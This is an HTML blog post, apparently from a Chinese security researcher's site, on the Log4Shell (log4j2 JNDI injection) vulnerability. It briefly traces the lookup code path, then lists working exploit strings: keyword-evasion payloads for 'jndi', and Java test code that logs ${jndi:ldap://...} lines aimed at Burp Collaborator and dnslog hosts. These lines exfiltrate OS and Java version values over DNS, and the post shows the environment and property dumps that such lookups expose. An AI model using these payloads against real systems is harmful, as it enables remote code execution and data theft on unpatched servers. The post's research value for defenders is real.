@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    
+    <title>log4j2杂谈 | hungry and humble</title>
+    
+    
+        <meta name="keywords" content="java" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="洞刚出忙着批量和写工具就没仔细分析漏洞成因，写这个是记录洞刚出来时的研究过程，其实爆出当天就看了logback这个包，好像是一个作者写的也是记录日志的作用，但是太晚就没怎么看，第二头就暴出配置文件jndi注入，哎。。。。 流程调试跟了下，就粗略看了看，这个洞告诉我看官方文档真的很重要！！！！ 1获取logger实例--&gt;org\apache\logging\log4j\spi\Abstrac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="log4j2杂谈">
+<meta property="og:url" content="https://little-gu.github.io/2022/01/10/log4j2%E6%9D%82%E8%B0%88/index.html">
+<meta property="og:site_name" content="hungry and humble">
+<meta property="og:description" content="洞刚出忙着批量和写工具就没仔细分析漏洞成因，写这个是记录洞刚出来时的研究过程，其实爆出当天就看了logback这个包，好像是一个作者写的也是记录日志的作用，但是太晚就没怎么看，第二头就暴出配置文件jndi注入，哎。。。。 流程调试跟了下，就粗略看了看，这个洞告诉我看官方文档真的很重要！！！！ 1获取logger实例--&gt;org\apache\logging\log4j\spi\Abstrac">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://little-gu.github.io/2022/01/10/log4j2%E6%9D%82%E8%B0%88/1.png">
+<meta property="og:image" content="https://little-gu.github.io/2022/01/10/log4j2%E6%9D%82%E8%B0%88/2.png">
+<meta property="article:published_time" content="2022-01-10T03:44:46.000Z">
+<meta property="article:modified_time" content="2022-02-08T03:57:16.698Z">
+<meta property="article:author" content="G7shot">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://little-gu.github.io/2022/01/10/log4j2%E6%9D%82%E8%B0%88/1.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="hungry and humble" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/ckrie.jpg" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">hungry and humble</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">index</a>
+                
+                    <a class="main-nav-link" href="/archives">archives</a>
+                
+                    <a class="main-nav-link" href="/about">about</a>
+                
+                    <a class="main-nav-link" href="/notes">notes</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">index</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">archives</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">about</a></td>
+                
+                    <td><a class="main-nav-link" href="/notes">notes</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            .net
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/25/viewstate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98/">viewstate反序列化实战</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            PHP代码审计
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/02/13/zzzcms/">zzzcms前台RCE</a></li>  <li class="file"><a href="/2020/03/12/%E5%AE%A1%E8%AE%A1%E6%9F%90cms%E5%88%B0insert%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/">审计某cms到insert注入技巧</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Python
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/12/02/github%E6%B3%84%E9%9C%B2%E5%B7%A5%E5%85%B7%E6%B5%8B%E8%AF%95/">github泄露工具测试</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            java
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/02/16/cc1%E9%93%BE/">cc1链</a></li>  <li class="file"><a href="/2020/03/19/cc2%E9%93%BE/">cc2链</a></li>  <li class="file"><a href="/2020/04/19/cc5%E9%93%BE/">cc5链</a></li>  <li class="file"><a href="/2021/04/03/%E7%BB%93%E5%90%88%E4%B8%A4%E6%9D%A1cc%E9%93%BE%E5%88%86%E6%9E%90ysoserial%E5%AE%9E%E7%8E%B0/">结合两条cc链分析ysoserial实现</a></li>  <li class="file"><a href="/2021/10/09/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/">fastjson不出网利用</a></li>  <li class="file"><a href="/2021/12/02/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8B%BF%E4%B8%8Bjava%E7%AB%99%E4%B9%8B%E5%90%8E%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%A7%A3%E5%86%B3/">记一次拿下java站之后的负载均衡解决</a></li>  <li class="file"><a href="/2021/12/07/java%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">java发序列化执行任意类的利用</a></li>  <li class="file"><a href="/2022/01/08/%E5%88%A9%E7%94%A8urldns%E5%8E%9F%E7%94%9F%E9%93%BE%E6%8E%A2%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E7%9B%B8%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E9%93%BE/">利用urldns原生链探测是否存在相应版本的反序列链</a></li>  <li class="file active"><a href="/2022/01/10/log4j2%E6%9D%82%E8%B0%88/">log4j2杂谈</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            注入
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/03/04/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bmssql/">攻击数据库之mssql</a></li>  <li class="file"><a href="/2020/12/08/%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B9%8Bdb2/">攻击数据库之db2</a></li>  <li class="file"><a href="/2021/12/05/%E8%8B%9B%E5%88%BB%E7%8E%AF%E5%A2%83%E4%B8%8Bmssql%E6%B3%A8%E5%85%A5/">苛刻环境下mssql注入</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            渗透
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/06/29/non-rce-ctf%E5%A4%8D%E7%8E%B0/">non-rce-ctf复现</a></li>  <li class="file"><a href="/2021/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E6%B8%97%E9%80%8Fselenium-server/">记一次曲折渗透selenium-server</a></li>  <li class="file"><a href="/2021/12/03/%E5%AE%9E%E6%88%98host%E7%A2%B0%E6%92%9E%E5%88%B0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">实战host碰撞到代码审计</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/2021/02/13/test/">test</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-log4j2杂谈" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/java/">java</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2022/01/10/log4j2%E6%9D%82%E8%B0%88/">
+            <time datetime="2022-01-10T03:44:46.000Z" itemprop="datePublished">2022-01-10</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/raw/writing/source/_posts/log4j2杂谈.md'> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/edit/writing/source/_posts/log4j2杂谈.md'> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/commits/writing/source/_posts/log4j2杂谈.md'> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            log4j2杂谈
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+        
+        
+            <p>洞刚出忙着批量和写工具就没仔细分析漏洞成因，写这个是记录洞刚出来时的研究过程，其实爆出当天就看了logback这个包，好像是一个作者写的也是记录日志的作用，但是太晚就没怎么看，第二头就暴出配置文件jndi注入，哎。。。。</p>
+<p>流程调试跟了下，就粗略看了看，这个洞告诉我看官方文档真的很重要！！！！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取logger实例--&gt;org\apache\logging\log4j\spi\AbstractLogger.class中的error方法--&gt;logIfEnabled方法判断语句跟进之后会判断记录日志等级是否是小于等于200(error是200)最后if方法返回true进入logMessage方法--&gt;然后稀里糊涂进入org\apache\logging\log4j\core\Logger.class中的log方法--&gt;org\apache\logging\log4j\core\config\DefaultReliabilityStrategy.class的log方法--&gt;一系列跟进发现message最后在LogEvent中的event变量--&gt;this.formatters[i].format(event, buffer)--&gt;提取$&#123;&#125;中的内容--&gt;最后跟到lookup方法    </span><br></pre></td></tr></table></figure>
+<p><img src="/2022/01/10/log4j2%E6%9D%82%E8%B0%88/1.png" alt="1"></p>
+<h2 id="绕过jndi字符"><a href="#绕过jndi字符" class="headerlink" title="绕过jndi字符"></a>绕过jndi字符</h2><p>${${env:test:-jn}d${env:test:-i}:ldap://ip:443/o=tomcat}<br>${${lower:j}${upper:n}${lower:d}${upper:i}:<br>官方文档是支持base64的—-<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution">https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution</a><br>${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}</p>
+<h1 id="获取操作系统信息"><a href="#获取操作系统信息" class="headerlink" title="获取操作系统信息"></a>获取操作系统信息</h1><p>ps:dns带外，值为空格和斜杠不行</p>
+<h2 id="env变量获取"><a href="#env变量获取" class="headerlink" title="env变量获取"></a>env变量获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">         <span class="comment">//logger.fatal(&quot;$&#123;$&#123;env1:test:-jndi&#125;:$&#123;base64:bGRhcA==&#125;://0rsf1zz92nu7etkj3d4t6mouolubi0.burpcollaborator.net&#125;&quot;);</span></span><br><span class="line">         <span class="comment">//logger.error(&quot;$&#123;$&#123;env1:test:-jndi&#125;&#125;:ldap://test111.9.dnslog.vuake.com&#125;&quot;);</span></span><br><span class="line">         logger.error(<span class="string">&quot;$&#123;jndi:ldap://aaaabbbb.ih3qkz76b15sv2xibvbjuddg47axym.burpcollaborator.net&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">//logger.error(&quot;$&#123;jndi:ldap://$&#123;sys:java.version&#125;.9.dns.vuake.com/x&#125;&quot;);</span></span><br><span class="line">        <span class="comment">//logger.error(&quot;$&#123;jndi:rmi://localhost:8777/calc&#125;&quot;);</span></span><br><span class="line">         <span class="comment">//logger.error(&quot;$&#123;$&#123;env:test:-jn&#125;d$&#123;env:test:-i&#125;:ldap://$&#123;env:OS&#125;.52.9.dns.vuake.com/x&#125;&quot;);</span></span><br><span class="line">        <span class="comment">/*获取全局env</span></span><br><span class="line"><span class="comment">        Map&lt;String,String&gt; envMap = System.getenv();</span></span><br><span class="line"><span class="comment">        envMap.forEach((k,v) -&gt; System.out.println(k + &quot;=&quot;+ v));</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">/*获取sys</span></span><br><span class="line"><span class="comment">        String os = System.getProperty(&quot;os.name&quot;);</span></span><br><span class="line"><span class="comment">        System.out.println(os);</span></span><br><span class="line"><span class="comment">        Properties properties = System.getProperties();</span></span><br><span class="line"><span class="comment">        properties.forEach((k,v) -&gt; System.out.println(k + &quot;=&quot; + v));</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>env—从全局变量中获取，win和Linux不一样<br>${env:test:-jndi} 获取到的值默认为jndi<br>${env:OS} 获取操作系统版本<br>${sys:os.name} windows有空格会有点问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">USERDOMAIN_ROAMINGPROFILE&#x3D;DESKTOP-VNUJ5RB</span><br><span class="line">LOCALAPPDATA&#x3D;C:\Users\hungry\AppData\Local</span><br><span class="line">PROCESSOR_LEVEL&#x3D;6</span><br><span class="line">USERDOMAIN&#x3D;DESKTOP-VNUJ5RB</span><br><span class="line">LOGONSERVER&#x3D;\\DESKTOP-VNUJ5RB</span><br><span class="line">JAVA_HOME&#x3D;C:\Program Files\Java\jdk1.8.0_251</span><br><span class="line">SESSIONNAME&#x3D;Console</span><br><span class="line">ALLUSERSPROFILE&#x3D;C:\ProgramData</span><br><span class="line">PROCESSOR_ARCHITECTURE&#x3D;AMD64</span><br><span class="line">PSModulePath&#x3D;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules</span><br><span class="line">USERNAME&#x3D;hungry</span><br><span class="line">OS&#x3D;Windows_NT</span><br><span class="line">COMPUTERNAME&#x3D;DESKTOP-VNUJ5RB</span><br><span class="line">PROCESSOR_REVISION&#x3D;5e03</span><br><span class="line">CLASSPATH&#x3D;.;C:\Program Files\Java\jdk1.8.0_251\lib\dt.jar;C:\Program Files\Java\jdk1.8.0_251\lib\tools.jar;</span><br><span class="line">CommonProgramW6432&#x3D;C:\Program Files\Common Files</span><br><span class="line">ComSpec&#x3D;C:\Windows\system32\cmd.exe</span><br><span class="line">ProgramData&#x3D;C:\ProgramData</span><br><span class="line">ProgramW6432&#x3D;C:\Program Files</span><br><span class="line">HOMEPATH&#x3D;\Users\hungry</span><br><span class="line">SystemRoot&#x3D;C:\Windows</span><br><span class="line">TEMP&#x3D;C:\Users\hungry\AppData\Local\Temp</span><br><span class="line">HOMEDRIVE&#x3D;C:</span><br><span class="line">PROCESSOR_IDENTIFIER&#x3D;Intel64 Family 6 Model 94 Stepping 3, GenuineIntel</span><br><span class="line">USERPROFILE&#x3D;C:\Users\hungry</span><br><span class="line">TMP&#x3D;C:\Users\hungry\AppData\Local\Temp</span><br><span class="line">CommonProgramFiles(x86)&#x3D;C:\Program Files (x86)\Common Files</span><br><span class="line">ProgramFiles&#x3D;C:\Program Files</span><br><span class="line">PUBLIC&#x3D;C:\Users\Public</span><br><span class="line">NUMBER_OF_PROCESSORS&#x3D;2</span><br><span class="line">windir&#x3D;C:\Windows</span><br></pre></td></tr></table></figure>
+
+<h2 id="sys变量获取"><a href="#sys变量获取" class="headerlink" title="sys变量获取"></a>sys变量获取</h2><p>${sys:java.verison}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">sun.cpu.isalist&#x3D;amd64</span><br><span class="line">sun.desktop&#x3D;windows</span><br><span class="line">sun.io.unicode.encoding&#x3D;UnicodeLittle</span><br><span class="line">sun.cpu.endian&#x3D;little</span><br><span class="line">java.vendor.url.bug&#x3D;http:&#x2F;&#x2F;bugreport.sun.com&#x2F;bugreport&#x2F;</span><br><span class="line">file.separator&#x3D;\</span><br><span class="line">java.ext.dirs&#x3D;C:\Program Files\Java\jdk1.8.0_102\jre\lib\ext;C:\Windows\Sun\Java\lib\ext</span><br><span class="line">java.version&#x3D;1.8.0_102</span><br><span class="line">java.vm.info&#x3D;mixed mode</span><br><span class="line">awt.toolkit&#x3D;sun.awt.windows.WToolkit</span><br><span class="line">user.language&#x3D;en</span><br><span class="line">java.specification.vendor&#x3D;Oracle Corporation</span><br><span class="line">sun.java.command&#x3D;log4j</span><br><span class="line">java.home&#x3D;C:\Program Files\Java\jdk1.8.0_102\jre</span><br><span class="line">sun.arch.data.model&#x3D;64</span><br><span class="line">java.vm.specification.version&#x3D;1.8</span><br><span class="line">user.name&#x3D;hungry</span><br><span class="line">file.encoding&#x3D;UTF-8</span><br><span class="line">java.specification.version&#x3D;1.8</span><br><span class="line">java.awt.printerjob&#x3D;sun.awt.windows.WPrinterJob</span><br><span class="line">user.timezone&#x3D;America&#x2F;Los_Angeles</span><br><span class="line">user.home&#x3D;C:\Users\hungry</span><br><span class="line">os.version&#x3D;10.0</span><br><span class="line">sun.management.compiler&#x3D;HotSpot 64-Bit Tiered Compilers</span><br><span class="line">java.specification.name&#x3D;Java Platform API Specification</span><br><span class="line">java.class.version&#x3D;52.0</span><br><span class="line">java.library.path&#x3D;C:\Users\hungry\Desktop\tools\apache-tomcat-8.5.69\bin</span><br><span class="line">sun.jnu.encoding&#x3D;Cp1252</span><br><span class="line">os.name&#x3D;Windows 10</span><br><span class="line">user.variant&#x3D;</span><br><span class="line">java.vm.specification.vendor&#x3D;Oracle Corporation</span><br><span class="line">java.io.tmpdir&#x3D;C:\Users\hungry\AppData\Local\Temp\</span><br><span class="line">line.separator&#x3D;</span><br><span class="line">java.endorsed.dirs&#x3D;C:\Program Files\Java\jdk1.8.0_102\jre\lib\endorsed</span><br><span class="line">os.arch&#x3D;amd64</span><br><span class="line">java.awt.graphicsenv&#x3D;sun.awt.Win32GraphicsEnvironment</span><br><span class="line">java.runtime.version&#x3D;1.8.0_102-b14</span><br><span class="line">java.vm.specification.name&#x3D;Java Virtual Machine Specification</span><br><span class="line">user.dir&#x3D;C:\Users\hungry\Desktop\tools\javah\apache-log4j-poc-main\apache-log4j-poc-main</span><br><span class="line">user.country&#x3D;US</span><br><span class="line">user.script&#x3D;</span><br><span class="line">sun.java.launcher&#x3D;SUN_STANDARD</span><br><span class="line">sun.os.patch.level&#x3D;</span><br><span class="line">java.vm.name&#x3D;Java HotSpot(TM) 64-Bit Server VM</span><br><span class="line">file.encoding.pkg&#x3D;sun.io</span><br><span class="line">path.separator&#x3D;;</span><br><span class="line">java.vm.vendor&#x3D;Oracle Corporation</span><br><span class="line">java.vendor.url&#x3D;http:&#x2F;&#x2F;java.oracle.com&#x2F;</span><br><span class="line">sun.boot.library.path&#x3D;C:\Program Files\Java\jdk1.8.0_102\jre\bin</span><br><span class="line">java.vm.version&#x3D;25.102-b14</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h2><p>Spring Boot Lookup 从 Spring 配置中检索 Spring 属性的值以及活动和默认配置文件的值<br><a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html#ContextMapLookup">https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html#ContextMapLookup</a></p>
+<h2 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h2><p>${web:rootDir}</p>
+<p>最后集成的工具支持jndi反序列化，高版本的绕过和常规利用<br><img src="/2022/01/10/log4j2%E6%9D%82%E8%B0%88/2.png" alt="2"></p>
+<p>一些特定框架出发log4j的点<br><a target="_blank" rel="noopener" href="https://github.com/SPuerBRead/Bridge">https://github.com/SPuerBRead/Bridge</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262852">https://www.anquanke.com/post/id/262852</a> struct<br><a target="_blank" rel="noopener" href="https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis">https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis</a></p>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+    
+        <a href="/2022/01/08/%E5%88%A9%E7%94%A8urldns%E5%8E%9F%E7%94%9F%E9%93%BE%E6%8E%A2%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E7%9B%B8%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E9%93%BE/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">利用urldns原生链探测是否存在相应版本的反序列链</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
